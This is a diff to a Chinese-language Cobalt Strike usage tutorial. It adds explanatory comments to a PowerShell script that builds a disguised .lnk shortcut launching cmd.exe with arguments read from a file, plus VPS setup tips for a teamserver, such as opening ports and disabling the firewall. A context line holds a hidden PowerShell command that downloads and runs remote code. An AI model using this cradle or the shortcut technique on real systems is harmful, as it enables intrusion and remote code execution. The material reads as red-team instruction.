@@ -752,12 +752,25 @@ cmd /c powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloa
 > 注意:LNK.ps1和test.txt要在同一目录下
 
 ```powershell
+# 从 "test.txt" 文件中获取内容，并将该内容存储在变量 $file 中
 $file = Get-Content "test.txt"
+
+# 创建一个 COM 对象，该对象对应于 Windows Script Host Shell，可以用来执行各种系统任务，例如创建快捷方式
 $WshShell = New-Object -comObject WScript.Shell
+
+# 使用 WSH Shell 的 `CreateShortcut` 方法创建一个快捷方式，该快捷方式的名称是 "test.lnk"
 $Shortcut = $WshShell.CreateShortcut("test.lnk")
-$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"  
+
+# 设置快捷方式的目标路径，也就是快捷方式所指向的程序。这里设置的是 cmd.exe，它是 Windows 的命令提示符
+$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"
+
+# 设置快捷方式的图标位置。这里设置的是 Shell32.dll 文件中的第 21 个图标
 $Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"
+
+# 设置当启动目标程序时要传递给它的命令行参数。这里设置的是 "test.txt" 文件的内容
 $Shortcut.Arguments = ''+ $file
+
+# 保存对快捷方式的所有更改，创建了实际的 ".lnk" 文件
 $Shortcut.Save()
 ```
 
@@ -1232,3 +1245,89 @@ beacon命令行输入`powershell-import`, 然后选择本地文件PowerUp.ps1
 
 ![image-20221011171333738](CobaltStrike的使用教程/image-20221011171333738.png)	
 
+
+
+# vps搭建可能遇到的问题
+
+## 1.文件上传
+
+若要将本机的文件上传至云服务器，你需通过Xshell来实现
+
+先在xshell连接云服务器，命令行中执行`rz`命令，即可实现文件上传
+
+> 若没有`rz`命令,则需用到以下命令进行安装(二选一):
+>
+> - 适用于redhat linux:` yum install lrzsz`
+> - 适用于centos或ununtu: `apt-get install lrzsz`
+
+
+
+## 2.文件解压
+
+将zip文件上传至服务器, 使用`unzip`命令解压压缩包
+
+```
+unzip xxx.zip
+```
+
+> 若没有此命令需先安装: apt-get install unzip
+
+
+
+## 3.文件权限问题
+
+进入Cobalt Strike的文件目录，你会发现不能执行`teamserver`文件，这是因为你没有给此目录赋予更高的权限,执行以下命令赋予最高权限
+
+```
+chmod -R 777 cs目录
+```
+
+
+
+## 4.安装java环境
+
+配置Cobalt Strike服务需要java环境的支持, 执行如下命令安装java
+
+```
+sudo apt-get update
+sudo apt-get install default-jdk
+```
+
+
+
+## 5.CS客户端出现timeout错误
+
+如下图所示, 在登录CS客户端时出现`Connection timed out`错误警告
+
+![](CobaltStrike的使用教程/1779065-20201123231643610-925595597.png)	
+
+
+
+首先检查云服务器安全组配置，开放对应的CS服务器监听端口
+
+![](CobaltStrike的使用教程/1779065-20201123231804772-460113617.png)
+![](CobaltStrike的使用教程/1779065-20201123231816533-1396392970.png)	
+
+
+
+关闭服务器防火墙，我的服务器系统是ubuntu，每个系统对应的命令是不同的。
+
+```
+sudo ufw disable
+```
+
+
+
+## 6.Cobalt Strike后台执行
+
+若Xshell与云服务器断开了连接, 则Cobalt Strike服务也会相应断开, 但可以通过Screen命令为Cobalt Strike服务设置后台执行
+
+安装Screen：`apt-get install screen`
+
+screen命令的常用操作如下：
+
+- `screen -S yourname`: 新建一个叫yourname的后台任务
+- `screen -ls`: 列出当前所有的后台任务
+- `screen -r yourname`: 切换至名为yourname的后台任务
+
+若要结束名为yourname的后台任务, 先使用`screen -r yourname`切换至此任务, 然后执行`exit`命令
